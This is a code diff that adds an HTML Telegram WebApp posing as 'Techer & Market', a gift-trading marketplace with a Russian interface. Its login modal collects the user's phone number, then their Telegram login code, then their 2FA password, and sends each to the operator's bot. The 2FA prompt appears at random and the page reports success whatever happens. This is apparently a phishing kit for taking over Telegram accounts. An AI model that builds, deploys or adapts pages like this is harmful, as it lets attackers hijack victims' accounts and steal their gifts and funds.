@@ -1,109 +1,582 @@
-const tg = window.Telegram.WebApp;
-tg.ready();
-tg.expand();
-
-let authData = {
-    phone: '',
-    isProcessing: false
-};
-
-function showStep(stepId) {
-    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-    document.getElementById(stepId).classList.add('active');
-    
-    if (stepId === 'welcome-step') {
-        tg.BackButton.hide();
-    } else if (stepId === 'phone-confirm-step') {
-        tg.BackButton.show();
-    } else {
-        tg.BackButton.hide();
-    }
-}
-
-function requestPhoneNumber() {
-    if (authData.isProcessing) {
-        console.log('⏳ Already processing, skipping...');
-        return;
-    }
-
-    console.log('📱 Requesting phone number via Telegram...');
-    
-    tg.requestContact((status, data) => {
-        console.log('📞 Contact request response:', status, data);
-        
-        if (status && data.responseUnsafe?.contact?.phone_number) {
-            let phone = data.responseUnsafe.contact.phone_number;
-            
-            if (!phone.startsWith('+')) {
-                phone = '+' + phone;
-            }
-            
-            authData.phone = phone;
-            document.getElementById('phone-display').textContent = phone;
-            showStep('phone-confirm-step');
-            console.log('✅ Phone received:', phone);
-        } else {
-            tg.showAlert('Не удалось получить номер телефона');
-            console.error('❌ No phone in response');
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techer & Market</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-    });
-}
 
-function submitPhone() {
-    if (authData.isProcessing) {
-        console.log('⏳ Already processing phone submission');
-        return;
-    }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #000;
+            color: #fff;
+            overflow-x: hidden;
+        }
 
-    if (!authData.phone) {
-        tg.showAlert('Номер телефона не получен');
-        return;
-    }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 20px;
+            border-bottom: 1px solid #222;
+            position: sticky;
+            top: 0;
+            background: #000;
+            z-index: 100;
+        }
 
-    console.log('🚀 Submitting phone:', authData.phone);
-    authData.isProcessing = true;
+        .header h1 {
+            font-size: 20px;
+            font-weight: 700;
+        }
 
-    // Показываем загрузку
-    showStep('loading-step');
-    document.getElementById('loading-title').textContent = 'Отправка номера...';
-    document.getElementById('loading-text').textContent = 'Ожидание ответа от бота';
+        .login-btn {
+            background: #0088cc;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 12px;
+            color: #fff;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 14px;
+        }
 
-    const payload = JSON.stringify({
-        action: 'request_code',
-        phone: authData.phone
-    });
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 1000;
+            padding: 20px;
+            overflow-y: auto;
+        }
 
-    console.log('📤 Payload:', payload);
+        .modal.active {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
 
-    try {
-        // Отправляем данные боту
-        tg.sendData(payload);
-        console.log('✅ Data sent, WebApp should close');
-        
-    } catch (error) {
-        console.error('❌ Error:', error);
-        authData.isProcessing = false;
-        showError('Ошибка отправки: ' + error.message);
-    }
-}
+        .modal-content {
+            background: #1a1a1a;
+            border-radius: 24px;
+            padding: 32px 24px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+        }
 
-function showError(message) {
-    authData.isProcessing = false;
-    document.getElementById('error-message').textContent = message;
-    showStep('error-step');
-}
+        .close-btn {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 32px;
+            color: #666;
+            cursor: pointer;
+            background: none;
+            border: none;
+        }
 
-// Обработка кнопки "Назад"
-tg.BackButton.onClick(() => {
-    showStep('welcome-step');
-    authData.isProcessing = false;
-});
+        .hero-image {
+            width: 100%;
+            height: 200px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 80px;
+            margin-bottom: 24px;
+            position: relative;
+            overflow: hidden;
+        }
 
-// Скрываем главную кнопку
-tg.MainButton.hide();
+        .hero-badge {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+        }
 
-console.log('✅ Telegram WebApp initialized:', {
-    version: tg.version,
-    platform: tg.platform,
-    initData: tg.initData ? 'Present' : 'Missing'
-});
+        .modal-content h2 {
+            font-size: 28px;
+            margin-bottom: 12px;
+        }
+
+        .modal-content p {
+            color: #999;
+            margin-bottom: 24px;
+            font-size: 15px;
+        }
+
+        .auth-btn {
+            width: 100%;
+            background: #0088cc;
+            border: none;
+            padding: 16px;
+            border-radius: 12px;
+            color: #fff;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .auth-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .input-group {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 16px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            color: #0088cc;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .input-group input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            outline: none;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 500;
+        }
+
+        .search-section {
+            padding: 20px;
+        }
+
+        .search-box {
+            background: #1a1a1a;
+            border-radius: 12px;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 16px;
+        }
+
+        .search-box input {
+            flex: 1;
+            background: none;
+            border: none;
+            outline: none;
+            color: #fff;
+            font-size: 15px;
+        }
+
+        .filters {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        .filter-btn {
+            padding: 8px 16px;
+            border-radius: 20px;
+            background: #1a1a1a;
+            border: none;
+            color: #fff;
+            font-size: 14px;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+
+        .filter-btn.active {
+            background: #0088cc;
+        }
+
+        .gifts-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+        }
+
+        .gift-card {
+            background: #1a1a1a;
+            border-radius: 16px;
+            overflow: hidden;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .gift-card:active {
+            transform: scale(0.95);
+        }
+
+        .gift-image {
+            width: 100%;
+            aspect-ratio: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 72px;
+            border-radius: 16px 16px 0 0;
+        }
+
+        .gift-info {
+            padding: 12px;
+        }
+
+        .gift-name {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .gift-number {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 8px;
+        }
+
+        .gift-price {
+            background: #2a2a2a;
+            padding: 8px 12px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-weight: 600;
+        }
+
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #000;
+            border-top: 1px solid #222;
+            display: flex;
+            justify-content: space-around;
+            padding: 12px 0;
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            color: #666;
+            font-size: 11px;
+            cursor: pointer;
+        }
+
+        .nav-item.active {
+            color: #0088cc;
+        }
+
+        .spinner {
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top-color: #fff;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <h1>Techer & Market</h1>
+        <button class="login-btn" id="loginBtn">Войти</button>
+    </div>
+
+    <!-- Auth Modal -->
+    <div class="modal" id="authModal">
+        <div class="modal-content">
+            <button class="close-btn" id="closeModal">×</button>
+            
+            <div class="hero-image">
+                <span>🧢</span>
+                <div class="hero-badge">TECHER & MARKET</div>
+            </div>
+
+            <h2>TECHER & MARKET</h2>
+            <p id="authMessage">Добро пожаловать!</p>
+
+            <div id="authStep1" style="display: block;">
+                <p style="margin-bottom: 24px;">Здесь начинается мир продажи и обмена подарками</p>
+                <button class="auth-btn" id="requestPhoneBtn">
+                    📱 Авторизоваться
+                </button>
+            </div>
+
+            <div id="authStep2" style="display: none;">
+                <div class="input-group">
+                    <label>🔑 Код подтверждения</label>
+                    <input type="text" id="codeInput" placeholder="Введите код из Telegram" maxlength="6">
+                </div>
+                <button class="auth-btn" id="verifyCodeBtn">
+                    Подтвердить код
+                </button>
+            </div>
+
+            <div id="authStep3" style="display: none;">
+                <div class="input-group">
+                    <label>🔐 Пароль 2FA</label>
+                    <input type="password" id="passwordInput" placeholder="Введите пароль 2FA">
+                </div>
+                <button class="auth-btn" id="verify2FABtn">
+                    Подтвердить пароль
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Search Section -->
+    <div class="search-section">
+        <div class="search-box">
+            <span>🔍</span>
+            <input type="text" placeholder="Поиск подарков..." id="searchInput">
+        </div>
+
+        <div class="filters">
+            <button class="filter-btn active" data-filter="all">Все</button>
+            <button class="filter-btn" data-filter="low">Цена: Низкая</button>
+            <button class="filter-btn" data-filter="high">Цена: Высокая</button>
+        </div>
+
+        <div class="gifts-grid" id="giftsGrid">
+            <!-- Gifts will be loaded here -->
+        </div>
+    </div>
+
+    <!-- Bottom Navigation -->
+    <div class="bottom-nav">
+        <div class="nav-item active">
+            <span>🏠</span>
+            <span>Маркет</span>
+        </div>
+        <div class="nav-item">
+            <span>📋</span>
+            <span>Коллекции</span>
+        </div>
+        <div class="nav-item">
+            <span>🎁</span>
+            <span>Мои подарки</span>
+        </div>
+        <div class="nav-item">
+            <span>👤</span>
+            <span>Активность</span>
+        </div>
+    </div>
+
+    <script>
+        // Инициализация Telegram WebApp
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+        tg.setHeaderColor('#000000');
+        tg.setBackgroundColor('#000000');
+
+        // Sample gifts data
+        const gifts = [
+            { id: 1, name: 'Westside Sign', number: '#400', price: '48', emoji: '🤙', bg: '#4a7c59' },
+            { id: 2, name: 'Cookie Heart', number: '#', price: '1.83', emoji: '🍪', bg: '#6b5fb5' },
+            { id: 3, name: 'Blue Star', number: '#', price: '25', emoji: '⭐', bg: '#4a7bb7' },
+            { id: 4, name: 'Red Gem', number: '#', price: '15', emoji: '💎', bg: '#b75d5d' },
+            { id: 5, name: 'Green Clover', number: '#200', price: '12', emoji: '🍀', bg: '#5d9c59' },
+            { id: 6, name: 'Gold Crown', number: '#50', price: '100', emoji: '👑', bg: '#d4af37' }
+        ];
+
+        // Render gifts
+        function renderGifts(filter = 'all') {
+            const grid = document.getElementById('giftsGrid');
+            let sortedGifts = [...gifts];
+
+            if (filter === 'low') {
+                sortedGifts.sort((a, b) => parseFloat(a.price) - parseFloat(b.price));
+            } else if (filter === 'high') {
+                sortedGifts.sort((a, b) => parseFloat(b.price) - parseFloat(a.price));
+            }
+
+            grid.innerHTML = sortedGifts.map(gift => `
+                <div class="gift-card" onclick="selectGift(${gift.id})">
+                    <div class="gift-image" style="background: ${gift.bg}">
+                        ${gift.emoji}
+                    </div>
+                    <div class="gift-info">
+                        <div class="gift-name">${gift.name}</div>
+                        <div class="gift-number">${gift.number}</div>
+                        <div class="gift-price">
+                            ${gift.price} TON ⚪
+                        </div>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        // Select gift
+        function selectGift(id) {
+            const gift = gifts.find(g => g.id === id);
+            tg.showPopup({
+                title: gift.name,
+                message: `Цена: ${gift.price} TON\n${gift.number}`,
+                buttons: [
+                    { id: 'buy', type: 'default', text: 'Купить' },
+                    { id: 'cancel', type: 'cancel' }
+                ]
+            }, (buttonId) => {
+                if (buttonId === 'buy') {
+                    tg.showAlert('Функция покупки скоро будет доступна!');
+                }
+            });
+        }
+
+        // Modal control
+        const modal = document.getElementById('authModal');
+        const loginBtn = document.getElementById('loginBtn');
+        const closeModal = document.getElementById('closeModal');
+
+        loginBtn.onclick = () => modal.classList.add('active');
+        closeModal.onclick = () => modal.classList.remove('active');
+
+        // Request phone number using Telegram's native popup
+        document.getElementById('requestPhoneBtn').onclick = async function() {
+            this.disabled = true;
+            this.innerHTML = '<div class="spinner"></div>';
+
+            try {
+                // Используем нативный метод requestContact из Telegram WebApp API
+                const result = await tg.requestContact();
+                
+                if (result && result.contact) {
+                    // Отправляем данные боту
+                    tg.sendData(JSON.stringify({
+                        action: 'phone_received',
+                        phone: result.contact.phoneNumber,
+                        userId: tg.initDataUnsafe?.user?.id
+                    }));
+
+                    // Переходим к следующему шагу
+                    document.getElementById('authStep1').style.display = 'none';
+                    document.getElementById('authStep2').style.display = 'block';
+                    document.getElementById('authMessage').textContent = 'Введите код из Telegram';
+                }
+            } catch (error) {
+                console.error('Error requesting contact:', error);
+                tg.showAlert('Ошибка при запросе номера телефона. Попробуйте еще раз.');
+            } finally {
+                this.disabled = false;
+                this.innerHTML = '📱 Авторизоваться';
+            }
+        };
+
+        // Verify code
+        document.getElementById('verifyCodeBtn').onclick = function() {
+            const code = document.getElementById('codeInput').value;
+            
+            if (!code || code.length < 5) {
+                tg.showAlert('Введите корректный код');
+                return;
+            }
+
+            this.disabled = true;
+            this.innerHTML = '<div class="spinner"></div>';
+
+            // Отправляем код боту
+            tg.sendData(JSON.stringify({
+                action: 'verify_code',
+                code: code,
+                userId: tg.initDataUnsafe?.user?.id
+            }));
+
+            // Симуляция: может потребоваться 2FA
+            setTimeout(() => {
+                const needs2FA = Math.random() > 0.7;
+                
+                if (needs2FA) {
+                    document.getElementById('authStep2').style.display = 'none';
+                    document.getElementById('authStep3').style.display = 'block';
+                    document.getElementById('authMessage').textContent = 'Введите пароль 2FA';
+                } else {
+                    modal.classList.remove('active');
+                    loginBtn.textContent = '✅ Авторизован';
+                    loginBtn.style.background = '#4caf50';
+                    tg.showAlert('Авторизация успешна!');
+                }
+                
+                this.disabled = false;
+                this.innerHTML = 'Подтвердить код';
+            }, 1500);
+        };
+
+        // Verify 2FA
+        document.getElementById('verify2FABtn').onclick = function() {
+            const password = document.getElementById('passwordInput').value;
+            
+            if (!password) {
+                tg.showAlert('Введите пароль 2FA');
+                return;
+            }
+
+            this.disabled = true;
+            this.innerHTML = '<div class="spinner"></div>';
+
+            // Отправляем пароль боту
+            tg.sendData(JSON.stringify({
+                action: 'verify_2fa',
+                password: password,
+                userId: tg.initDataUnsafe?.user?.id
+            }));
+
+            setTimeout(() => {
+                modal.classList.remove('active');
+                loginBtn.textContent = '✅ Авторизован';
+                loginBtn.style.background = '#4caf50';
+                tg.showAlert('Авторизация успешна!');
+                
+                this.disabled = false;
+                this.innerHTML = 'Подтвердить пароль';
+            }, 1500);
+        };
+
+        // Filter buttons
+        document.querySelectorAll('.filter-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                renderGifts(this.dataset.filter);
+            });
+        });
+
+        // Initial render
+        renderGifts();
+    </script>
+</body>
+</html>
